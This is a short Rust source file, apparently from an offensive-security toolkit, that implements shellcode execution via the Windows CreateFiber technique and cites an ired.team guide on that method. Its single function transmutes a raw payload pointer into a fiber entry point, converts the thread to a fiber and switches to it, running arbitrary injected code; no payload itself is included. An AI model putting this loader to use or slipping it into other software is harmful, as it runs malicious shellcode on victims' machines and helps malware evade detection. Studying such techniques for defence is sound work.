/*
    https://www.ired.team/offensive-security/code-injection-process-injection/executing-shellcode-with-createfiber
    https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Threading/
*/

use std::{ffi::c_void, ptr::null_mut};
use windows_sys::Win32::System::Threading::{ConvertThreadToFiber, CreateFiber, SwitchToFiber};

pub fn fiber(payload: *const c_void) {
    unsafe {
        let fiber_addr = CreateFiber(
            0,
            Some(std::mem::transmute(payload)),
            null_mut() as *const c_void,
        );

        ConvertThreadToFiber(null_mut() as *const c_void);
        SwitchToFiber(fiber_addr);
    }
}
